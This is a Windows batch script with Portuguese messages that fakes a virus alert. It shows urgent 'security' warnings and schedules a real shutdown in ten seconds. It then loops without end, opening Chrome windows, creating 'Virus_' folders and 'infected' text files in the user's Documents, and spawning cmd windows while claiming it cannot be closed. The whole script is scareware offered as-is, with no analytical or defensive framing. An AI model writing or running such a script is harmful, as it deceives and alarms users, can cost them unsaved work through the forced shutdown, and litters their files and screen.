@echo off
title Sistema em Analise...
:start
color 0C
cls
echo.
echo ==================================================
echo !!! ALERTA DE SEGURANCA: ACAO URGENTE !!!
echo ==================================================
echo.
echo Foi detetado um alto nivel de atividade de virus.
echo.
echo A RESOLVER ERRO...
timeout /t 3 >nul

echo.
echo O SISTEMA IRA DESLIGAR EM 10 SEGUNDOS.
shutdown /s /t 10

:loop
:: Muda a cor do terminal de forma aleatoria mas segura
color F%random:~-1%
cls

:: Abre uma nova janela do Chrome e cria uma nova pasta com ficheiro
start chrome "https://www.google.com"
mkdir "%userprofile%\Documents\Virus_%random%"
echo FICHEIRO INFECTADO > "%userprofile%\Documents\Virus_%random%\Erro_%random%.txt"

echo ===========================================
echo !!! ERRO CRITICO DO SISTEMA !!!
echo ===========================================
echo.
echo Nao eh possivel encerrar o programa.
echo Pressione qualquer tecla para tentar fechar...
pause >nul
echo.
echo Tentativa de fechamento bloqueada.
start "" cmd /c "echo. && echo Erro: o programa nao pode ser encerrado. && pause"
goto loop